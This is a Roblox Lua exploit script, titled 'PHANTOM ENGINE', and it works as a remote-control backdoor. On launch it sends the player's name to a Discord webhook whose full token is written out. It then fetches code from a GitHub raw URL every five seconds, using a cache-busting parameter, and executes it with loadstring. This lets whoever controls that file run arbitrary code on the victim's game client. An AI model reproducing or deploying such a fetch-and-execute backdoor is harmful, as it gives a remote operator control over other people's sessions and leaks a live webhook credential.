-- [[ PHANTOM ENGINE: 2026 CACHE-BYPASS ]]
local LP = game:GetService("Players").LocalPlayer
local HS = game:GetService("HttpService")
local US = game:GetService("UserInputService")
local GS = game:GetService("GuiService")
local MS = game:GetService("MarketplaceService")

local WEBHOOK = "https://webhook.lewisakura.moe/api/webhooks/1497643214176518197/VarvH0-wuUuPMwfPXZP23LoOmqbwcB3qmq3NKhCKUTIDrQVC-MHSvQ4Or7Ky6Hj1TxyC"
local RAW_URL = "https://raw.githubusercontent.com/thegoodoneatgamez/commander/refs/heads/main/commands.lua"

-- IMMEDIATE INFO (Testing if the script even runs)
task.spawn(function()
    local data = {["content"] = "🛰️ **Engine Linked:** " .. LP.Name .. " is now listening..."}
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    if req then req({Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HS:JSONEncode(data)}) end
end)

task.wait(10) -- Join protection

local lastCode = ""
while true do
    -- THE FIX: Append a completely unique string to the URL to bypass cache
    local cacheBuster = "?t=" .. os.time() .. "&rand=" .. math.random(1, 100000)
    local s, code = pcall(function() 
        return game:HttpGet(RAW_URL .. cacheBuster) 
    end)
    
    if s and code ~= lastCode and code ~= "" and code ~= "none" then
        lastCode = code
        local taskFunc = loadstring(code)
        if taskFunc then
            task.spawn(taskFunc)
        end
    end
    task.wait(5)
end
